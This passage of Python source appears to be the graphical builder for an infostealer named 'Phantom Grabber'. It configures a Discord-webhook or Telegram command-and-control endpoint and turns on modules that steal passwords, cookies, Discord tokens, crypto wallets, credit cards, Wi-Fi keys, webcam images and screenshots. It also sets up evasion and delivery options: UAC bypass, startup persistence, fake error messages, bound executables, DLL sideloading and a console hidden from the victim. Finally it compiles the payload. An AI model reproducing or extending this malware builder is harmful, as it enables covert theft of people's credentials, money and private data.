        else:
            self.c2_mode_btn.configure(text="Mode: Telegram")
            self.c2_label.configure(text="Telegram Endpoint:")
            self.c2_entry.configure(placeholder_text="BOT_TOKEN$CHAT_ID")

    def _update_discord_only_controls(self) -> None:
        """Disable/enable controls that only apply to Discord mode."""
        discord_only_vars = [
            self.options_frame.pingVar,
            self.options_frame.discordInjectionVar,
        ]
        if self.c2_mode == 1:  # Telegram — disable Discord-only
            for var in discord_only_vars:
                var.set(False)

    def _test_endpoint(self) -> None:
        endpoint = self.c2_entry.get().strip()
        if not endpoint:
            messagebox.showwarning("Warning", "Please enter an endpoint first.")
            return

        self.status_label.configure(text="Testing endpoint...", text_color=COLOR_WARNING)
        self.test_btn.configure(state="disabled")
        self.c2_mode_btn.configure(state="disabled")
        self.build_btn.configure(state="disabled")

        def _test_thread():
            if self.c2_mode == 0:
                ok = Utility.TestWebhook(endpoint)
            else:
                ok = Utility.TestTelegram(endpoint)

            self.after(0, lambda: self._on_test_result(ok))

        threading.Thread(target=_test_thread, daemon=True).start()

    def _on_test_result(self, success: bool) -> None:
        self.test_btn.configure(state="normal")
        self.c2_mode_btn.configure(state="normal")
        self.build_btn.configure(state="normal")
        if success:
            self.status_label.configure(text="✓ Endpoint valid", text_color=COLOR_SUCCESS)
            messagebox.showinfo("Success", "Endpoint is valid and reachable!")
        else:
            self.status_label.configure(text="✗ Endpoint invalid", text_color=COLOR_DANGER)
            messagebox.showerror("Error", "Endpoint is invalid or unreachable.")

    # ── Output / Console Toggles ─────────────────────────────────────────
    def _toggle_output_mode(self) -> None:
        self.output_mode = "py" if self.output_mode == "exe" else "exe"
        if self.output_mode == "exe":
            self.output_btn.configure(text="Output: EXE\n(Standard Compiled Executable)")
            self._set_exe_only_controls(enabled=True)
        else:
            self.output_btn.configure(text="Output: PY\n(Standalone Python Script)")
            self._set_exe_only_controls(enabled=False)

    def _set_exe_only_controls(self, enabled: bool) -> None:
        """Lock or unlock controls that are EXE-mode only."""
        state = "normal" if enabled else "disabled"
        exe_only_buttons = [self.bind_btn, self.icon_btn, self.fake_error_btn]
        exe_only_vars = [
            self.options_frame.startupVar,
            self.options_frame.uacBypassVar,
            self.options_frame.vmProtectVar,
        ]
        for btn in exe_only_buttons:
            btn.configure(state=state)
        if not enabled:
            for var in exe_only_vars:
                var.set(False)
            # Reset fake error and bind/icon if disabling
            if self.fake_error_enabled:
                self.fake_error_enabled = False
                self.fake_error_btn.configure(text="Fake Error: OFF\n(Shows fake error on start)")
            if self.bind_path:
                self.bind_path = None
                self.bind_btn.configure(text="Bind Executable: None\n(Run another EXE alongside payload)")
            if self.icon_path:
                self.icon_path = None
                self.icon_btn.configure(text="Icon: Default\n(Custom icon for payload)")

    def _toggle_console_mode(self) -> None:
        self.console_mode_index = (self.console_mode_index + 1) % 3
        mode_name = CONSOLE_MODES[self.console_mode_index]
        descriptions = ["Hidden from victim", "Always visible", "Verbose debug output"]
        desc = descriptions[self.console_mode_index]
        self.console_btn.configure(text=f"Console: {mode_name}\n({desc})")

    # ── Bind / Icon ──────────────────────────────────────────────────────
    def _select_bind(self) -> None:
        path = filedialog.askopenfilename(
            title="Select Executable to Bind",
            filetypes=[("Executables", "*.exe"), ("All Files", "*.*")]
        )
        if path:
            self.bind_path = path
            filename = os.path.basename(path)
            self.bind_btn.configure(text=f"Bind: {filename[:25]}")
            self.status_label.configure(text=f"Bind set: {filename}", text_color=COLOR_TEXT_DIM)
        else:
            self.bind_path = None
            self.bind_btn.configure(text="Bind Executable: None")

    def _select_icon(self) -> None:
        path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon Files", "*.ico"), ("Images", "*.png;*.jpg;*.bmp"), ("All Files", "*.*")]
        )
        if path:
            self.icon_path = path
            filename = os.path.basename(path)
            self.icon_btn.configure(text=f"Icon: {filename[:25]}")
            self.status_label.configure(text=f"Icon set: {filename}", text_color=COLOR_TEXT_DIM)
        else:
            self.icon_path = None
            self.icon_btn.configure(text="Icon: Default")

    # ── Fake Error ───────────────────────────────────────────────────────
    def _configure_fake_error(self) -> None:
        if self.fake_error_enabled:
            # Toggle OFF
            self.fake_error_enabled = False
            self.fake_error_btn.configure(text="Fake Error: OFF\n(Shows fake error on start)")
            self.status_label.configure(text="Fake error disabled", text_color=COLOR_TEXT_DIM)
        else:
            # Open config popup
            FakeErrorPopup(self, self._on_fake_error_apply, self.fake_error_config)

    def _on_fake_error_apply(self, title: str, message: str, icon_idx: int) -> None:
        self.fake_error_enabled = True
        self.fake_error_config = (title, message, icon_idx)
        self.fake_error_btn.configure(text=f"Fake Error: ON ({title[:15]})\n(Click to disable)")
        self.status_label.configure(text=f"Fake error configured: {title}", text_color=COLOR_TEXT_DIM)

    # ── Mutex ────────────────────────────────────────────────────────────
    def _randomize_mutex(self) -> None:
        new_mutex = uuid.uuid4().hex
        self.mutex_entry.delete(0, "end")
        self.mutex_entry.insert(0, new_mutex)
        self.status_label.configure(text=f"Mutex: {new_mutex[:16]}...", text_color=COLOR_TEXT_DIM)

    # ── Delivery ─────────────────────────────────────────────────────────
    def _on_delivery_changed(self, choice: str) -> None:
        key = self._delivery_display_to_key.get(choice, "exe")
        self.delivery_method = key

        # hide all contextual widgets first
        self.decoy_btn.pack_forget()
        self.hosted_url_frame.pack_forget()
        self.dll_name_frame.pack_forget()
        self.sideload_btn.pack_forget()

        if key in ("image", "all"):
            self.decoy_btn.pack(after=self.delivery_dropdown, pady=3, padx=20)
        if key in ("powershell", "lnk", "all"):
            self.hosted_url_frame.pack(after=self.delivery_dropdown, fill="x", padx=20, pady=3)
        if key in ("dll", "dll_sideload", "all"):
            self.dll_name_frame.pack(after=self.delivery_dropdown, fill="x", padx=20, pady=3)
        if key in ("dll_sideload", "all"):
            self.sideload_btn.pack(after=self.delivery_dropdown, pady=3, padx=20)

        self.status_label.configure(
            text=f"Delivery: {choice}", text_color=COLOR_TEXT_DIM
        )

    def _select_decoy_image(self) -> None:
        path = filedialog.askopenfilename(
            title="Select Decoy Image",
            filetypes=[("Images", "*.jpg;*.jpeg;*.png;*.bmp;*.gif"), ("All", "*.*")],
        )
        if path:
            self.decoy_image_path = path
            fname = os.path.basename(path)
            self.decoy_btn.configure(text=f"Decoy: {fname[:22]}")
            self.status_label.configure(text=f"Decoy image set: {fname}", text_color=COLOR_TEXT_DIM)
        else:
            self.decoy_image_path = None
            self.decoy_btn.configure(text="Select Decoy Image")

    def _select_sideload_target(self) -> None:
        path = filedialog.askopenfilename(
            title="Select Target DLL to Proxy",
            filetypes=[("DLL Files", "*.dll"), ("All Files", "*.*")],
        )
        if path:
            self.sideload_target_path = path
            fname = os.path.basename(path)
            self.sideload_btn.configure(text=f"Target DLL: {fname[:22]}")
            self.status_label.configure(text=f"Sideload target: {fname}", text_color=COLOR_TEXT_DIM)
        else:
            self.sideload_target_path = None
            self.sideload_btn.configure(text="Target DLL: preset (version.dll)")

    # ── Build Config Dict ────────────────────────────────────────────────
    def _build_config(self) -> dict | None:
        """Assemble config dict from GUI state. Returns None on validation failure."""
        endpoint = self.c2_entry.get().strip()
        if not endpoint:
            messagebox.showerror("Error", "C2 endpoint is required!")
            return None

        if self.c2_mode == 0:
            if any(c.isspace() for c in endpoint):
                messagebox.showerror("Error", "Webhook cannot contain spaces!")
                return None
            if not endpoint.startswith(("http://", "https://")):
                messagebox.showerror("Error", "Invalid webhook URL — must start with http:// or https://")
                return None
            if "discord" not in endpoint.lower():
                if not messagebox.askyesno("Warning", "URL doesn't look like a Discord webhook. Continue?"):
                    return None
        else:
            if any(c.isspace() for c in endpoint):
                messagebox.showerror("Error", "Endpoint cannot contain spaces!")
                return None
            if endpoint.count("$") != 1:
                messagebox.showerror("Error", "Telegram endpoint must be TOKEN$CHATID format (exactly one '$').")
                return None
            token, chat_id = endpoint.split("$", 1)
            if not token:
                messagebox.showerror("Error", "Bot token cannot be empty!")
                return None
            if not chat_id:
                messagebox.showerror("Error", "Chat ID cannot be empty!")
                return None

        opts = self.options_frame
        active_modules = [
            opts.capturePasswordsVar, opts.captureCookiesVar, opts.captureHistoryVar,
            opts.captureAutofillsVar, opts.captureDiscordTokensVar, opts.captureGamesVar,
            opts.captureWalletsVar, opts.captureWifiVar, opts.captureSystemInfoVar,
            opts.captureScreenshotVar, opts.captureWebcamVar, opts.captureTelegramVar,
            opts.captureCommonFilesVar, opts.captureExifVar, opts.captureCreditCardsVar,
        ]
        if not any(v.get() for v in active_modules):
            messagebox.showwarning("Warning", "You must enable at least one collection module!")
            return None

        if not Utility.CheckInternetConnection():
            if not messagebox.askyesno("Warning", "No internet connection detected. Build anyway?"):
                return None

        mutex = self.mutex_entry.get().strip()
        if not mutex:
            mutex = uuid.uuid4().hex

        opts = self.options_frame

        config = {
            "settings": {
                "c2": [self.c2_mode, endpoint],
                "mutex": mutex,
                "pingme": opts.pingVar.get(),
                "vmprotect": opts.vmProtectVar.get(),
                "startup": opts.startupVar.get(),
                "melt": opts.meltVar.get(),
                "uacBypass": opts.uacBypassVar.get(),
                "archivePassword": opts.get_password(),
                "consoleMode": self.console_mode_index,
                "debug": self.console_mode_index == 2,
                "pumpedStubSize": opts.get_pump_size(),
                "boundFileRunOnStartup": self.bind_path is not None,
            },
            "modules": {
                "captureWebcam": opts.captureWebcamVar.get(),
                "capturePasswords": opts.capturePasswordsVar.get(),
                "captureCookies": opts.captureCookiesVar.get(),
                "captureHistory": opts.captureHistoryVar.get(),
                "captureAutofills": opts.captureAutofillsVar.get(),
                "captureDiscordTokens": opts.captureDiscordTokensVar.get(),
                "captureGames": opts.captureGamesVar.get(),
                "captureWifiPasswords": opts.captureWifiVar.get(),
                "captureSystemInfo": opts.captureSystemInfoVar.get(),
                "captureScreenshot": opts.captureScreenshotVar.get(),
                "captureTelegramSession": opts.captureTelegramVar.get(),
                "captureCommonFiles": opts.captureCommonFilesVar.get(),
                "captureWallets": opts.captureWalletsVar.get(),
                "captureExif": opts.captureExifVar.get(),
                "captureCreditCards": opts.captureCreditCardsVar.get(),
                "fakeError": [
                    self.fake_error_enabled,
                    [self.fake_error_config[0], self.fake_error_config[1], self.fake_error_config[2]],
                ],
                "blockAvSites": opts.blockAvVar.get(),
                "discordInjection": opts.discordInjectionVar.get(),
            },
        }

        return config

    def _write_config(self, config: dict) -> str:
        """Write config to Components/config.json and return the path."""
        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Components", "config.json")
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=4)
        return config_path

    # ── Build Actions ────────────────────────────────────────────────────
    def _on_build(self) -> None:
        if self.is_building:
            messagebox.showinfo("Info", "Build already in progress!")
            return

        config = self._build_config()
        if config is None:
            return

        config_path = self._write_config(config)
        logger.info(f"Config saved: {config_path}")

        # Auto-switch to Console tab to show live build output
        self.tabview.set("Build Console")

        match self.output_mode:
            case "exe":
                self.BuildExecutable(config)
            case "py":
                self.BuildPythonFile(config)

    def BuildExecutable(self, config: dict) -> None:
        """Build the compiled .exe by setting up the Build venv and running run.bat in console."""
        import ctypes
        import shutil

        def Exit(code: int = 0) -> None:
            os.system("pause > NUL")
            sys.exit(code)

        def clear() -> None:
            os.system("cls")

        def format_log(title: str, description: str) -> str:
            return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)

        self.destroy()
        Utility.ToggleConsole(True)
        try:
            ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
        except Exception:
            pass
        clear()

        # Define Build directory paths
        base_dir = os.path.dirname(os.path.abspath(__file__))
        build_dir = os.path.join(base_dir, "Build")
        venv_dir = os.path.join(build_dir, "env")
        scripts_dir = os.path.join(venv_dir, "Scripts")

        os.makedirs(build_dir, exist_ok=True)

        if not os.path.isfile(os.path.join(scripts_dir, "activate")):
            if True:
                print(format_log("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
                res = subprocess.run(f'python -m venv "{venv_dir}"', capture_output=True, shell=True)
                clear()
                if res.returncode != 0:
                    print('Error while creating virtual environment ("python -m venv Build\\env"): {}'.format(res.stderr.decode(errors="ignore")))
                    Exit(1)

        print(format_log("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
        components_dir = os.path.join(base_dir, "Components")
        for item in os.listdir(components_dir):
            src = os.path.join(components_dir, item)
            dst = os.path.join(scripts_dir, item)
            if os.path.isdir(src):
                if item in ("build", "dist"):
                    continue # Skip old build artifacts
                if os.path.isdir(dst):
                    shutil.rmtree(dst)
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)

        # Write config.json into the Scripts folder
        with open(os.path.join(scripts_dir, "config.json"), "w", encoding="utf-8") as file:
            json.dump(config, file, indent=4)

        clear()

        # Change directory to Scripts folder
        os.chdir(scripts_dir)

        # Copy icon.ico if specified
        if os.path.isfile("icon.ico"):
            try:
                os.remove("icon.ico")
            except Exception:
                pass
        if self.icon_path and os.path.isfile(self.icon_path):
            try:
                shutil.copy2(self.icon_path, "icon.ico")
            except Exception as e:
                print(format_log("\u001b[31;1mERROR", f"Failed to copy icon: {e}"))

        # Copy bound.exe if specified
        if os.path.isfile("bound.exe"):
            try:
                os.remove("bound.exe")
            except Exception:
                pass
        if self.bind_path and os.path.isfile(self.bind_path):
            try:
                shutil.copy2(self.bind_path, "bound.exe")
            except Exception as e:
                print(format_log("\u001b[31;1mERROR", f"Failed to copy bound executable: {e}"))

        # Start run.bat in a console window
        os.startfile("run.bat")
        sys.exit(0)

    def BuildPythonFile(self, config: dict) -> None:
        """Generate the merged Python stub file."""
        self.is_building = True
        self.build_btn.configure(state="disabled", text="Generating...")
        self.status_label.configure(text="Generating Python stub...", text_color=COLOR_WARNING)
        self.progress_bar.set(0.1)

        # Ask where to save before threading
        save_path = filedialog.asksaveasfilename(
            title="Save Python Stub As",
            defaultextension=".py",
            filetypes=[("Python Files", "*.py"), ("All Files", "*.*")],
            initialfile="phantom_stub.py"
        )
        if not save_path:
            self.is_building = False
            self.build_btn.configure(state="normal", text="⚡ BUILD")
            self.status_label.configure(text="Cancelled", text_color=COLOR_TEXT_DIM)
            return

        def _build_thread():
            try:
                components_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Components")

                # Write config to Components/config.json so WritePythonStub can read it
                config_path = os.path.join(components_dir, "config.json")
                with open(config_path, "w", encoding="utf-8") as f:
                    json.dump(config, f, indent=4)

                sys.path.insert(0, components_dir)
                try:
                    import importlib
                    import process as _proc
                    importlib.reload(_proc)  # force reload so ReadSettings picks up fresh config
                    from process import WritePythonStub
                except ImportError:
                    self.after(0, lambda: self._build_error(
                        "Components/process.py not found.\nMake sure the Components directory is complete."
                    ))
                    return

                self.after(0, lambda: self.progress_bar.set(0.4))
                code = WritePythonStub(config)

                self.after(0, lambda: self.progress_bar.set(0.9))

                with open(save_path, "w", encoding="utf-8") as f:
                    f.write(code)

                self.after(0, lambda: self.progress_bar.set(1.0))
                self.after(0, lambda: self._build_success(f"Python stub saved to:\n{save_path}"))

            except Exception as e:
                self.after(0, lambda: self._build_error(str(e)))

        threading.Thread(target=_build_thread, daemon=True).start()


    def _build_success(self, message: str) -> None:
        self.is_building = False
        self.build_btn.configure(state="normal", text="⚡ BUILD")
        self.status_label.configure(text=f"✓ {message}", text_color=COLOR_SUCCESS)
        messagebox.showinfo("Build Complete", message)

    def _build_error(self, error: str) -> None:
        self.is_building = False
        self.build_btn.configure(state="normal", text="⚡ BUILD")
        self.status_label.configure(text=f"✗ Build failed", text_color=COLOR_DANGER)
        self.progress_bar.set(0)
        messagebox.showerror("Build Error", f"Build failed:\n{error}")
        logger.error(f"Build failed: {error}")

    def log_to_textbox(self, text: str) -> None:
        """Appends log text thread-safely to the UI log textbox."""
        if not hasattr(self, "log_textbox") or self.log_textbox is None:
            return
        # Use after() to keep Tkinter UI updates safe across threads
        self.after(0, self._thread_safe_append_log, text)

    def _thread_safe_append_log(self, text: str) -> None:
        try:
            self.log_textbox.configure(state="normal")
            self.log_textbox.insert("end", text)
            self.log_textbox.see("end")
            self.log_textbox.configure(state="disabled")
        except Exception:
            pass

    def _save_log_file(self) -> None:
        """Saves current textbox contents to a local text file chosen by the user."""
        try:
            log_content = self.log_textbox.get("1.0", "end-1c")
            if not log_content.strip():
                messagebox.showwarning("Warning", "Logs are currently empty.")
                return

            filepath = filedialog.asksaveasfilename(
                title="Save Logs As",
                defaultextension=".txt",
                filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
                initialfile="phantom_build.log"
            )
            if filepath:
                with open(filepath, "w", encoding="utf-8") as f:
                    f.write(log_content)
                messagebox.showinfo("Saved", f"Logs successfully saved to:\n{filepath}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save log: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════
def check_environment() -> bool:
    """Validate the runtime environment before launching."""
    # OS check
    if platform.system() != "Windows":
        messagebox.showerror("Error", "Phantom Grabber requires Windows 10/11.")
        return False

    # Python version check
    major, minor = sys.version_info.major, sys.version_info.minor
    if major < 3 or (major == 3 and minor < 10):
        messagebox.showerror("Error", f"Python 3.10+ required. Current: {major}.{minor}")
        return False

    # Components folder check
    components_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Components")
    if not os.path.isdir(components_dir):
        messagebox.showerror("Error", "Components directory not found!\nMake sure you're running from the project root.")
        return False

    return True


def elevate_if_needed() -> None:
    """Attempt to elevate to admin if not already running as admin."""
    if not Utility.IsAdmin():
        logger.info("Not running as admin. Attempting elevation...")
        try:
            import ctypes
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 1
            )
            if result > 32:
                sys.exit(0)
            else:
                logger.warning("UAC elevation was declined or failed. Continuing without admin.")
        except Exception as e:
            logger.warning(f"Elevation failed: {e}. Continuing without admin.")


if __name__ == "__main__":
    # Hide console window
    Utility.ToggleConsole(False)

    if not check_environment():
        sys.exit(1)

    # Try to elevate (non-blocking — continues if declined)
    elevate_if_needed()

    # Check configuration
    Utility.CheckConfiguration()

    # Launch the GUI
    app = Builder()
    app.mainloop()
